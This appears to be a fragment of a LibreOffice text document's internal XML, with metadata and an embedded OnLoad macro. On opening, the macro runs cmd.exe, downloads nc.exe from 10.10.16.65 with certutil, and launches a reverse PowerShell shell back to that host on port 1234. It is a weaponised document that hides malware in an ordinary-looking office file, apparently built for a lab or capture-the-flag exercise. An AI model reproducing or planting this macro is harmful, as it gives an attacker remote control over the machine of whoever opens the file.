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246f6b" officeooo:paragraph-rsid="00246f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 is the repor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08:04:15.907916900</meta:creation-date>
    <meta:generator>LibreOffice/6.1.5.2$Linux_X86_64 LibreOffice_project/10$Build-2</meta:generator>
    <dc:date>2019-05-17T08:16:08.353418942</dc:date>
    <meta:editing-duration>PT10M2S</meta:editing-duration>
    <meta:editing-cycles>7</meta:editing-cycles>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="1" meta:paragraph-count="1" meta:word-count="4" meta:character-count="19" meta:non-whitespace-character-count="1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OnLoad
	Shell("cmd.exe /C net use /D /Y * &amp;&amp; cmd.exe /C certutil.exe -urlcache -split -f 'http://10.10.16.65/nc.exe' C:\Users\Public\nc.exe &amp; C:\Users\Public\nc.exe 10.10.16.65 1234 -e powershell.exe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